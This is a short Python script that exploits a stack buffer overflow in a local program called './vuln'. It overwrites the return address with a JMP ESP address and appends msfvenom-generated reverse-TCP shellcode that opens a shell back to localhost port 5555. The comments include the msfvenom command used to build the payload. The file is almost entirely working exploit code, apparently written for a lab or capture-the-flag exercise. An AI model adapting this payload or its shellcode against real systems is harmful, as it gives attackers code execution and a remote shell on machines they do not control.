import struct
import os

# Prefix to get us to the EIP
prefix = "A" * 812

# Memory location of the JMP ESP assembly code
jmp_esp_addr = struct.pack('<I', 0x80485c0)

# Shellcode: linux/x86/shell_reverse_tcp to localhost:5555
# msfvenom -f c -n 20 -b "\x00\x0a\x0d" \
# -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=5555
shellcode = (
"\x91\x9f\x3f\x41\x27\xd6\xfc\x37\x40\xfc\x91\x43\x90\xd6\x91"
"\x27\x98\x92\x9b\x9b\xd9\xea\xd9\x74\x24\xf4\xba\xc0\xa6\x1e"
"\xc6\x5d\x2b\xc9\xb1\x12\x31\x55\x17\x83\xed\xfc\x03\x95\xb5"
"\xfc\x33\x24\x61\xf7\x5f\x15\xd6\xab\xf5\x9b\x51\xaa\xba\xfd"
"\xac\xad\x28\x58\x9f\x91\x83\xda\x96\x94\xe2\xb2\x57\x67\x15"
"\x43\xc0\x65\x15\x56\xa3\xe3\xf4\xe8\xa5\xa3\xa7\x5b\x99\x47"
"\xc1\xba\x10\xc7\x83\x54\xc5\xe7\x50\xcc\x71\xd7\xb9\x6e\xeb"
"\xae\x25\x3c\xb8\x39\x48\x70\x35\xf7\x0b"
)

# Putting it all together
buffer = prefix + jmp_esp_addr + shellcode

# Execute and pass buffer as an argument
PROGNAME="./vuln"
os.execv(PROGNAME, [PROGNAME, buffer])